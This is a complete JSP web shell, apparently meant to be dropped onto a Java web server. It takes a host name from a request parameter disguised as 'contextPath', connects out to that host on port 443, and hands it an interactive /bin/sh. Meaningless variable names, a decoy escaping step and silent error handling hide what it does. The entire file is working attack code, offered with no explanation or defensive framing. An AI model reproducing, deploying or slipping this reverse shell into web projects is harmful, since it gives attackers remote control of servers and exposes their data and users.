<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream dg;
    OutputStream sj;

    StreamConnector( InputStream dg, OutputStream sj )
    {
      this.dg = dg;
      this.sj = sj;
    }

    public void run()
    {
      BufferedReader aw  = null;
      BufferedWriter hmg = null;
      try
      {
        aw  = new BufferedReader( new InputStreamReader( this.dg ) );
        hmg = new BufferedWriter( new OutputStreamWriter( this.sj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = aw.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hmg.write( buffer, 0, length );
          hmg.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( aw != null )
          aw.close();
        if( hmg != null )
          hmg.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String contextPath = request.getParameter("contextPath") == null ? request.getContextPath() : (String) request.getParameter("contextPath");
    if(contextPath.equals("/")) contextPath = "";
    contextPath = contextPath.replace("<", "&lt;").replace(">","&gt;").replace("&", "&amp;").replace("\"","&quot;").replace("\'", "&#039;");

    String ShellPath = new String("/bin/sh");
    Socket socket = new Socket(contextPath, 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>